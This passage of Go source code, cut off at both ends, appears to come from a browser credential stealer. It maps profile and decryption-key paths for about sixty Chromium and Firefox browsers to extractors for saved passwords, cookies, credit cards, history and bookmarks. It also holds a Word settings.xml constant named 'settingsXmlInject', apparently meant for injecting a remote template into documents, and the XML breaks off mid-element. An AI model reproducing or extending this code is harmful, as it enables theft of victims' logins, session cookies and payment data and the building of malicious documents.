		"firefox-nightly": {
			ProfilePath: os.Getenv("USERPROFILE") + fireFoxNightlyProfilePath,
			Name:        firefoxNightlyName,
			New:         NewFirefox,
		},
		"firefox-esr": {
			ProfilePath: os.Getenv("USERPROFILE") + fireFoxESRProfilePath,
			Name:        firefoxESRName,
			New:         NewFirefox,
		},
		"waterfox": {
			ProfilePath: os.Getenv("USERPROFILE") + waterfoxProfilePath,
			Name:        waterfoxName,
			New:         NewFirefox,
		},
		"kmeleon": {
			ProfilePath: os.Getenv("USERPROFILE") + kmeleonProfilePath,
			Name:        kmeleonName,
			New:         NewFirefox,
		},
		"chrome": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeKeyPath,
			Name:        chromeName,
			New:         NewChromium,
		},
		"chrome-beta": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeBetaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeBetaKeyPath,
			Name:        chromeBetaName,
			New:         NewChromium,
		},
		"chromium": {
			ProfilePath: os.Getenv("USERPROFILE") + chromiumProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromiumKeyPath,
			Name:        chromiumName,
			New:         NewChromium,
		},
		"edge": {
			ProfilePath: os.Getenv("USERPROFILE") + edgeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + edgeKeyPath,
			Name:        edgeName,
			New:         NewChromium,
		},
		"360": {
			ProfilePath: os.Getenv("USERPROFILE") + speed360ProfilePath,
			Name:        speed360Name,
			New:         NewChromium,
		},
		"qq": {
			ProfilePath: os.Getenv("USERPROFILE") + qqBrowserProfilePath,
			Name:        qqBrowserName,
			New:         NewChromium,
		},
		"brave": {
			ProfilePath: os.Getenv("USERPROFILE") + braveProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + braveKeyPath,
			Name:        braveName,
			New:         NewChromium,
		},
		"opera": {
			ProfilePath: os.Getenv("USERPROFILE") + operaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + operaKeyPath,
			Name:        operaName,
			New:         NewChromium,
		},
		"opera-gx": {
			ProfilePath: os.Getenv("USERPROFILE") + operaGXProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + operaGXKeyPath,
			Name:        operaGXName,
			New:         NewChromium,
		},
		"vivaldi": {
			ProfilePath: os.Getenv("USERPROFILE") + vivaldiProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + vivaldiKeyPath,
			Name:        vivaldiName,
			New:         NewChromium,
		},
		"iridium": {
			ProfilePath: os.Getenv("USERPROFILE") + iridiumProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + iridiumKeyPath,
			Name:        iridiumName,
			New:         NewChromium,
		},
		"sevenStar": {
			ProfilePath: os.Getenv("USERPROFILE") + sevenStarProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + sevenStarKeyPath,
			Name:        sevenStarName,
			New:         NewChromium,
		},
		"centBrowser": {
			ProfilePath: os.Getenv("USERPROFILE") + centBrowserProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + centBrowserKeyPath,
			Name:        centBrowserName,
			New:         NewChromium,
		},
		"torch": {
			ProfilePath: os.Getenv("USERPROFILE") + torchProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + torchKeyPath,
			Name:        torchName,
			New:         NewChromium,
		},
		"yandex": {
			ProfilePath: os.Getenv("USERPROFILE") + yandexProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + yandexKeyPath,
			Name:        yandexName,
			New:         NewChromium,
		},
		"chedot": {
			ProfilePath: os.Getenv("USERPROFILE") + chedotProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chedotKeyPath,
			Name:        chedotName,
			New:         NewChromium,
		},
		"kometa": {
			ProfilePath: os.Getenv("USERPROFILE") + kometaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + kometaKeyPath,
			Name:        kometaName,
			New:         NewChromium,
		},
		"elements": {
			ProfilePath: os.Getenv("USERPROFILE") + elementsProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + elementsKeyPath,
			Name:        elementsName,
			New:         NewChromium,
		},
		"epic": {
			ProfilePath: os.Getenv("USERPROFILE") + epicProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + epicKeyPath,
			Name:        epicName,
			New:         NewChromium,
		},
		"uCozMedia": {
			ProfilePath: os.Getenv("USERPROFILE") + uCozMediaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + uCozMediaKeyPath,
			Name:        uCozMediaName,
			New:         NewChromium,
		},
		"fenrir": {
			ProfilePath: os.Getenv("USERPROFILE") + fenrirProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + fenrirKeyPath,
			Name:        fenrirName,
			New:         NewChromium,
		},
		"fenrir0": {
			ProfilePath: os.Getenv("USERPROFILE") + fenrir0ProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + fenrir0KeyPath,
			Name:        fenrir0Name,
			New:         NewChromium,
		},
		"catalinaGroup": {
			ProfilePath: os.Getenv("USERPROFILE") + catalinaGroupProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + catalinaGroupKeyPath,
			Name:        catalinaGroupName,
			New:         NewChromium,
		},
		"coowon": {
			ProfilePath: os.Getenv("USERPROFILE") + coowonProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + coowonKeyPath,
			Name:        coowonName,
			New:         NewChromium,
		},
		"liebao": {
			ProfilePath: os.Getenv("USERPROFILE") + liebaoProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + liebaoKeyPath,
			Name:        liebaoName,
			New:         NewChromium,
		},
		"qIP": {
			ProfilePath: os.Getenv("USERPROFILE") + qIPProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + qIPKeyPath,
			Name:        qIPName,
			New:         NewChromium,
		},
		"orbitum": {
			ProfilePath: os.Getenv("USERPROFILE") + orbitumProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + orbitumKeyPath,
			Name:        orbitumName,
			New:         NewChromium,
		},
		"comodo": {
			ProfilePath: os.Getenv("USERPROFILE") + comodoProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + comodoKeyPath,
			Name:        comodoName,
			New:         NewChromium,
		},
		"amigo": {
			ProfilePath: os.Getenv("USERPROFILE") + amigoProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + amigoKeyPath,
			Name:        amigoName,
			New:         NewChromium,
		},
		"comodo2": {
			ProfilePath: os.Getenv("USERPROFILE") + comodo2ProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + comodo2KeyPath,
			Name:        comodo2Name,
			New:         NewChromium,
		},
		"maxthon3": {
			ProfilePath: os.Getenv("USERPROFILE") + maxthon3ProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + maxthon3KeyPath,
			Name:        maxthon3Name,
			New:         NewChromium,
		},
		"kMelon": {
			ProfilePath: os.Getenv("USERPROFILE") + kMelonProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + kMelonKeyPath,
			Name:        kMelonName,
			New:         NewChromium,
		},
		"sputnik": {
			ProfilePath: os.Getenv("USERPROFILE") + sputnikProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + sputnikKeyPath,
			Name:        sputnikName,
			New:         NewChromium,
		},
		"nichrome": {
			ProfilePath: os.Getenv("USERPROFILE") + nichromeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + nichromeKeyPath,
			Name:        nichromeName,
			New:         NewChromium,
		},
		"cocCoc": {
			ProfilePath: os.Getenv("USERPROFILE") + cocCocProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + cocCocKeyPath,
			Name:        cocCocName,
			New:         NewChromium,
		},
		"uran": {
			ProfilePath: os.Getenv("USERPROFILE") + uranProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + uranKeyPath,
			Name:        uranName,
			New:         NewChromium,
		},
		"chromodo": {
			ProfilePath: os.Getenv("USERPROFILE") + chromodoProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromodoKeyPath,
			Name:        chromodoName,
			New:         NewChromium,
		},
		"mailRu": {
			ProfilePath: os.Getenv("USERPROFILE") + mailRuProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + mailRuKeyPath,
			Name:        mailRuName,
			New:         NewChromium,
		},
		"mapleStudio": {
			ProfilePath: os.Getenv("USERPROFILE") + mapleStudioProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + mapleStudioKeyPath,
			Name:        mapleStudioName,
			New:         NewChromium,
		},
		"chromeSxS": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeSxSProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeSxSKeyPath,
			Name:        chromeSxS,
			New:         NewChromium,
		},
		"spark": {
			ProfilePath: os.Getenv("USERPROFILE") + sparkBrowserProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + sparkBrowserKeyPath,
			Name:        spark,
			New:         NewChromium,
		},
		"titan": {
			ProfilePath: os.Getenv("USERPROFILE") + titanProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + titanKeyPath,
			Name:        titan,
			New:         NewChromium,
		},
		"superbird": {
			ProfilePath: os.Getenv("USERPROFILE") + superbirdProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + superbirdKeyPath,
			Name:        superbird,
			New:         NewChromium,
		},
		"mustang": {
			ProfilePath: os.Getenv("USERPROFILE") + mustangBrowserProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + mustangBrowserKeyPath,
			Name:        mustang,
			New:         NewChromium,
		},
		"rockmelt": {
			ProfilePath: os.Getenv("USERPROFILE") + rockProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + rockKeyPath,
			Name:        rockmelt,
			New:         NewChromium,
		},
		"torbro": {
			ProfilePath: os.Getenv("USERPROFILE") + torBroProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + torBroKeyPath,
			Name:        torbro,
			New:         NewChromium,
		},

		"goo": {
			ProfilePath: os.Getenv("USERPROFILE") + goProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + goKeyPath,
			Name:        goo,
			New:         NewChromium,
		},
		"xpom": {
			ProfilePath: os.Getenv("USERPROFILE") + xpomfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + xpomKeyPath,
			Name:        xpom,
			New:         NewChromium,
		},
		"bromium": {
			ProfilePath: os.Getenv("USERPROFILE") + bromiumfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + bromiumKeyPath,
			Name:        bromium,
			New:         NewChromium,
		},
		"suhba": {
			ProfilePath: os.Getenv("USERPROFILE") + suhbaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + suhbatKeyPath,
			Name:        suhba,
			New:         NewChromium,
		},
		"safer": {
			ProfilePath: os.Getenv("USERPROFILE") + saferProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + safertKeyPath,
			Name:        safer,
			New:         NewChromium,
		},
		"cryptotab": {
			ProfilePath: os.Getenv("USERPROFILE") + cryptotabProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + cryptotabKeyPath,
			Name:        cryptotab,
			New:         NewChromium,
		},
		"cef": {
			ProfilePath: os.Getenv("USERPROFILE") + cefProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + cefKeyPath,
			Name:        cef,
			New:         NewChromium,
		},
		"avast": {
			ProfilePath: os.Getenv("USERPROFILE") + avastProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + avastKeyPath,
			Name:        avast,
			New:         NewChromium,
		},
	}

	chromiumItems = map[string]struct {
		mainFile string
		newItem  func(mainFile, subFile string) Item
	}{
		bookmark: {
			mainFile: ChromeBookmarkFile,
			newItem:  NewBookmarks,
		},
		cookie: {
			mainFile: ChromeCookieFile,
			newItem:  NewCookies,
		},
		history: {
			mainFile: ChromeHistoryFile,
			newItem:  NewHistoryData,
		},
		download: {
			mainFile: ChromeDownloadFile,
			newItem:  NewDownloads,
		},
		password: {
			mainFile: ChromePasswordFile,
			newItem:  NewCPasswords,
		},
		creditcard: {
			mainFile: ChromeCreditFile,
			newItem:  NewCCards,
		},
	}

	firefoxItems = map[string]struct {
		mainFile string
		subFile  string
		newItem  func(mainFile, subFile string) Item
	}{
		bookmark: {
			mainFile: FirefoxDataFile,
			newItem:  NewBookmarks,
		},
		cookie: {
			mainFile: FirefoxCookieFile,
			newItem:  NewCookies,
		},
		history: {
			mainFile: FirefoxDataFile,
			newItem:  NewHistoryData,
		},
		download: {
			mainFile: FirefoxDataFile,
			newItem:  NewDownloads,
		},
		password: {
			mainFile: FirefoxKey4File,
			subFile:  FirefoxLoginFile,
			newItem:  NewFPasswords,
		},
	}
)

const (
	avastKeyPath              = "\\AppData\\Local\\AVAST Software\\Browser\\User Data\\Local State"
	avastProfilePath          = "\\AppData\\Local\\AVAST Software\\Browser\\User Data\\*\\"
	amigoKeyPath              = "\\AppData\\Local\\Amigo\\User\\User Data\\Local State"
	amigoProfilePath          = "\\AppData\\Local\\Amigo\\User\\User Data\\*\\"
	braveKeyPath              = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
	braveProfilePath          = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\*\\"
	cefKeyPath                = "\\AppData\\Local\\CEF\\User Data\\Local State"
	cefProfilePath            = "\\AppData\\Local\\CEF\\User Data\\*\\"
	catalinaGroupKeyPath      = "\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data\\Local State"
	catalinaGroupProfilePath  = "\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data\\*\\"
	rockKeyPath               = "\\AppData\\Local\\RockMelt\\User Data\\Local State"
	rockProfilePath           = "\\AppData\\Local\\RockMelt\\User Data\\*\\"
	centBrowserKeyPath        = "\\AppData\\Local\\CentBrowser\\User Data\\Local State"
	sparkBrowserProfilePath   = "\\AppData\\Local\\Spark\\User Data\\*\\"
	sparkBrowserKeyPath       = "\\AppData\\Local\\Spark\\User Data\\Local State"
	mustangBrowserProfilePath = "\\AppData\\Local\\Mustang Browser\\User Data\\*\\"
	mustangBrowserKeyPath     = "\\AppData\\Local\\Mustang Browser\\User Data\\Local State"
	centBrowserProfilePath    = "\\AppData\\Local\\CentBrowser\\User Data\\*\\"
	chedotKeyPath             = "\\AppData\\Local\\Chedot\\User Data\\Local State"
	chedotProfilePath         = "\\AppData\\Local\\Chedot\\User Data\\*\\"
	suhbatKeyPath             = "\\AppData\\Local\\Suhba\\User Data\\Local State"
	suhbaProfilePath          = "\\AppData\\Local\\Suhba\\User Data\\*\\"
	safertKeyPath             = "\\AppData\\Local\\Safer Technologies\\Secure Browser\\User Data\\Local State"
	saferProfilePath          = "\\AppData\\Local\\Safer Technologies\\Secure Browser\\User Data\\*\\"
	cryptotabKeyPath          = "\\AppData\\Local\\CryptoTab Browser\\User Data\\Local State"
	cryptotabProfilePath      = "\\AppData\\Local\\CryptoTab Browser\\User Data\\*\\"
	superbirdKeyPath          = "\\AppData\\Local\\Superbird\\User Data\\Local State"
	superbirdProfilePath      = "\\AppData\\Local\\Superbird\\User Data\\*\\"
	goKeyPath                 = "\\AppData\\Local\\Go!\\User Data\\Local State"
	goProfilePath             = "\\AppData\\Local\\Go!\\User Data\\*\\"
	xpomKeyPath               = "\\AppData\\Local\\Xpom\\User Data\\Local State"
	xpomfilePath              = "\\AppData\\Local\\Xpom\\User Data\\*\\"
	bromiumKeyPath            = "\\AppData\\Local\\Bromium\\User Data\\Local State"
	bromiumfilePath           = "\\AppData\\Local\\Bromium\\User Data\\*\\"
	chromeSxSKeyPath          = "\\AppData\\Local\\Google\\Chrome SxS\\User Data\\Local State"
	chromeSxSProfilePath      = "\\AppData\\Local\\Google\\Chrome SxS\\User Data\\*\\"
	chromeBetaKeyPath         = "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State"
	chromeBetaProfilePath     = "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\*\\"
	torBroKeyPath             = "\\AppData\\Local\\TorBro\\Profile\\User Data\\Local State"
	torBroProfilePath         = "\\AppData\\Local\\TorBro\\Profile\\User Data\\*\\"
	chromeKeyPath             = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	chromeProfilePath         = "\\AppData\\Local\\Google\\Chrome\\User Data\\*\\"
	chromiumKeyPath           = "\\AppData\\Local\\Chromium\\User Data\\Local State"
	chromiumProfilePath       = "\\AppData\\Local\\Chromium\\User Data\\*\\"
	chromodoKeyPath           = "\\AppData\\Local\\Chromodo\\User Data\\Local State"
	chromodoProfilePath       = "\\AppData\\Local\\Chromodo\\User Data\\*\\"
	cocCocKeyPath             = "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Local State"
	cocCocProfilePath         = "\\AppData\\Local\\CocCoc\\Browser\\User Data\\*\\"
	comodo2KeyPath            = "\\AppData\\Local\\Comodo\\User Data\\Local State"
	comodo2ProfilePath        = "\\AppData\\Local\\Comodo\\User Data\\*\\"
	titanKeyPath              = "\\AppData\\Local\\Titan Browser\\User Data\\Local State"
	titanProfilePath          = "\\AppData\\Local\\Titan Browser\\User Data\\*\\"
	comodoKeyPath             = "\\AppData\\Local\\Comodo\\Dragon\\User Data\\Local State"
	comodoProfilePath         = "\\AppData\\Local\\Comodo\\Dragon\\User Data\\*\\"
	coowonKeyPath             = "\\AppData\\Local\\Coowon\\Coowon\\User Data\\Local State"
	coowonProfilePath         = "\\AppData\\Local\\Coowon\\Coowon\\User Data\\*\\"
	edgeKeyPath               = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
	edgeProfilePath           = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\*\\"
	elementsKeyPath           = "\\AppData\\Local\\Elements Browser\\User Data\\Local State"
	elementsProfilePath       = "\\AppData\\Local\\Elements Browser\\User Data\\*\\"
	epicKeyPath               = "\\AppData\\Local\\Epic Privacy Browser\\User Data\\Local State"
	epicProfilePath           = "\\AppData\\Local\\Epic Privacy Browser\\User Data\\*\\"
	fenrir0KeyPath            = "\\AppData\\Local\\Fenrir Inc\\Sleipnir\\setting\\modules\\ChromiumViewer\\Local State"
	fenrir0ProfilePath        = "\\AppData\\Local\\Fenrir Inc\\Sleipnir\\setting\\modules\\ChromiumViewer\\*\\"
	fenrirKeyPath             = "\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Local State"
	fenrirProfilePath         = "\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\*\\"
	fireFoxBetaProfilePath    = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-beta*\\"
	fireFoxDevProfilePath     = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.dev-edition-default*\\"
	fireFoxESRProfilePath     = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-esr*\\"
	fireFoxNightlyProfilePath = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-nightly*\\"
	iridiumKeyPath            = "\\AppData\\Local\\Iridium\\User Data\\Local State"
	iridiumProfilePath        = "\\AppData\\Local\\Iridium\\User Data\\*\\"
	kMelonKeyPath             = "\\AppData\\Local\\K-Melon\\User Data\\Local State"
	kMelonProfilePath         = "\\AppData\\Local\\K-Melon\\User Data\\*\\"
	kometaKeyPath             = "\\AppData\\Local\\Kometa\\User Data\\Local State"
	kometaProfilePath         = "\\AppData\\Local\\Kometa\\User Data\\*\\"
	liebaoKeyPath             = "\\AppData\\Local\\liebao\\User Data\\Local State"
	liebaoProfilePath         = "\\AppData\\Local\\liebao\\User Data\\*\\"
	mailRuKeyPath             = "\\AppData\\Local\\Mail.Ru\\Atom\\User Data\\Local State"
	mailRuProfilePath         = "\\AppData\\Local\\Mail.Ru\\Atom\\User Data\\*\\"
	mapleStudioKeyPath        = "\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data\\Local State"
	mapleStudioProfilePath    = "\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data\\*\\"
	maxthon3KeyPath           = "\\AppData\\Local\\Maxthon3\\User Data\\Local State"
	maxthon3ProfilePath       = "\\AppData\\Local\\Maxthon3\\User Data\\*\\"
	nichromeKeyPath           = "\\AppData\\Local\\Nichrome\\User Data\\Local State"
	nichromeProfilePath       = "\\AppData\\Local\\Nichrome\\User Data\\*\\"
	operaGXKeyPath            = "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"
	operaGXProfilePath        = "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\"
	operaKeyPath              = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"
	operaProfilePath          = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\"
	orbitumKeyPath            = "\\AppData\\Local\\Orbitum\\User Data\\Local State"
	orbitumProfilePath        = "\\AppData\\Local\\Orbitum\\User Data\\*\\"
	qIPKeyPath                = "\\AppData\\Local\\QIP Surf\\User Data\\Local State"
	qIPProfilePath            = "\\AppData\\Local\\QIP Surf\\User Data\\*\\"
	qqBrowserProfilePath      = "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\*\\"
	sevenStarKeyPath          = "\\AppData\\Local\\7Star\\7Star\\User Data\\Local State"
	sevenStarProfilePath      = "\\AppData\\Local\\7Star\\7Star\\User Data\\*\\"
	speed360ProfilePath       = "\\AppData\\Local\\360chrome\\Chrome\\User Data\\*\\"
	sputnikKeyPath            = "\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\Local State"
	sputnikProfilePath        = "\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\*\\"
	torchKeyPath              = "\\AppData\\Local\\Torch\\User Data\\Local State"
	torchProfilePath          = "\\AppData\\Local\\Torch\\User Data\\*\\"
	uCozMediaKeyPath          = "\\AppData\\Local\\uCozMedia\\Uran\\User Data\\Local State"
	uCozMediaProfilePath      = "\\AppData\\Local\\uCozMedia\\Uran\\User Data\\*\\"
	uranKeyPath               = "\\AppData\\Local\\Uran\\User Data\\Local State"
	uranProfilePath           = "\\AppData\\Local\\Uran\\User Data\\*\\"
	vivaldiKeyPath            = "\\AppData\\Local\\Vivaldi\\Local State"
	vivaldiProfilePath        = "\\AppData\\Local\\Vivaldi\\User Data\\Default\\"
	yandexKeyPath             = "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State"
	yandexProfilePath         = "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\*\\"
	firefoxProfilePath        = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release*\\"
	waterfoxProfilePath       = "\\AppData\\Roaming\\Waterfox\\Profiles\\*.*-edition-default\\"
	kmeleonProfilePath        = "\\AppData\\Roaming\\K-Meleon\\*.default"

	chromeSxS          = "Chrome SxS"
	chromeName         = "Chrome"
	chromeBetaName     = "Chrome Beta"
	chromiumName       = "Chromium"
	edgeName           = "Microsoft Edge"
	firefoxName        = "Firefox"
	firefoxBetaName    = "Firefox Beta"
	firefoxDevName     = "Firefox Dev"
	firefoxNightlyName = "Firefox Nightly"
	firefoxESRName     = "Firefox ESR"
	speed360Name       = "360speed"
	qqBrowserName      = "qq"
	braveName          = "Brave"
	operaName          = "Opera"
	operaGXName        = "OperaGX"
	vivaldiName        = "Vivaldi"
	iridiumName        = "Iridium"
	sevenStarName      = "7Star"
	centBrowserName    = "Cent"
	torchName          = "Torch"
	yandexName         = "Yandex"
	chedotName         = "Chedot"
	kometaName         = "Kometa"
	elementsName       = "Elements"
	epicName           = "Epic"
	uCozMediaName      = "uCozMedia"
	fenrirName         = "Sleipnir 5"
	fenrir0Name        = "Sleipnir"
	catalinaGroupName  = "Catalina Group"
	coowonName         = "Coowon"
	liebaoName         = "Liebao"
	qIPName            = "QIP"
	orbitumName        = "Orbitum"
	comodoName         = "Comodo"
	amigoName          = "Amigo"
	comodo2Name        = "Comodo2"
	maxthon3Name       = "Maxthon3"
	kMelonName         = "KMelon"
	sputnikName        = "Sputnik"
	nichromeName       = "Nichrome"
	cocCocName         = "CocCoc"
	uranName           = "Uran"
	chromodoName       = "Chromodo"
	mailRuName         = "Atom"
	mapleStudioName    = "Maple Studio"
	waterfoxName       = "WaterFox"
	kmeleonName        = "KMeleon"
	spark              = "Spark"
	titan              = "Titan"
	superbird          = "Superbird"
	mustang            = "Mustang"
	rockmelt           = "RockMelt"
	torbro             = "TorBro"
	goo                = "Go!"
	xpom               = "Xpom"
	bromium            = "Bromium"
	suhba              = "Suhba"
	safer              = "Safer Browser"
	cryptotab          = "CryptoTab"
	cef                = "Chromium Embedded Framework"
	avast              = "Avast Secure"

	ChromeCreditFile   = "Web Data"
	ChromePasswordFile = "Login Data"
	ChromeHistoryFile  = "History"
	ChromeDownloadFile = "History"
	ChromeCookieFile   = "Cookies"
	ChromeBookmarkFile = "Bookmarks"
	FirefoxCookieFile  = "cookies.sqlite"
	FirefoxKey4File    = "key4.db"
	FirefoxLoginFile   = "logins.json"
	FirefoxDataFile    = "places.sqlite"

	cookie     = "cookie"
	history    = "history"
	bookmark   = "bookmark"
	download   = "download"
	password   = "password"
	creditcard = "creditcard"

	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"

	settingsXmlInject = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15 w16se w16cid"><w:zoom w:percent="100"/><w:removePersonalInformation/><w:removeDateAndTime/><w:activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="6" w:nlCheck="1" w:checkStyle="1"/><w:activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="0" w:nlCheck="1" w:checkStyle="0"/><w:attachedTemplate r:id="rId1"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:hdrShapeDefaults><o:shapedefaults v:ext="edit" spidmax="2049"/></w:hdrShapeDefaults><w:footnotePr><w:footnote w:id="-1"/><w:footnote w:id="0"/></w:footnotePr><w:endnotePr><w:endnote w:id="-1"/><w:endnote w:id="0"/></w:endnotePr><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="useWord2013TrackBottomHyphenation" w:uri="http://schemas.microsoft.com/office/word" w:val="0"/></w:compat><w:rsids><w:rsidRoot w:val="00FA0D47"/><w:rsid w:val="00007202"/><w:rsid w:val="000150E9"/><w:rsid w:val="00030E3C"/><w:rsid w:val="00072D27"/><w:rsid w:val="00083C22"/><w:rsid w:val="00086E87"/><w:rsid w:val="000871A8"/><w:rsid w:val="000A036B"/><w:rsid w:val="000D0E4A"/><w:rsid w:val="000F11B9"/><w:rsid w:val="00102341"/><w:rsid w:val="00105960"/><w:rsid w:val="001073CE"/><w:rsid w:val="00121553"/><w:rsid w:val="00131CAB"/><w:rsid w:val="001D0BD1"/><w:rsid w:val="002017AC"/><w:rsid w:val="002359ED"/><w:rsid w:val="00252520"/><w:rsid w:val="002625F9"/><w:rsid w:val="002631F7"/><w:rsid w:val="0026484A"/><w:rsid w:val="0026504D"/><w:rsid w:val="00276926"/><w:rsid w:val="002A67C8"/><w:rsid w:val="002B40B7"/><w:rsid w:val="002C5D75"/><w:rsid w:val="00301789"/><w:rsid w:val="00325194"/><w:rsid w:val="003728E3"/><w:rsid w:val="003962D3"/><w:rsid w:val="003C7D9D"/><w:rsid w:val="003E3A63"/><w:rsid w:val="00457BEB"/><w:rsid w:val="00461B2E"/><w:rsid w:val="00482CFC"/><w:rsid w:val="00487996"/><w:rsid w:val="00491910"/><w:rsid w:val="004A3D03"/><w:rsid w:val="004B6D7F"/><w:rsid w:val="004D785F"/><w:rsid w:val="004E744B"/><w:rsid w:val="004F7760"/><w:rsid w:val="00520AC9"/><w:rsid w:val="00594254"/><w:rsid w:val="005B6EB8"/><w:rsid w:val="00614CAB"/><w:rsid w:val="00633BC0"/><w:rsid w:val="00661DE5"/><w:rsid w:val="006706DE"/><w:rsid w:val="0069487E"/><w:rsid w:val="006A648B"/><w:rsid w:val="006B0B82"/><w:rsid w:val="006B7EF2"/><w:rsid w:val="006C3B5F"/><w:rsid w:val="006D3A72"/><w:rsid w:val="006F53EE"/><w:rsid w:val="00717507"/><w:rsid w:val="007263B8"/><w:rsid w:val="00726D9C"/><w:rsid w:val="00726F2C"/><w:rsid w:val="00736D30"/><w:rsid w:val="00742FF3"/><w:rsid 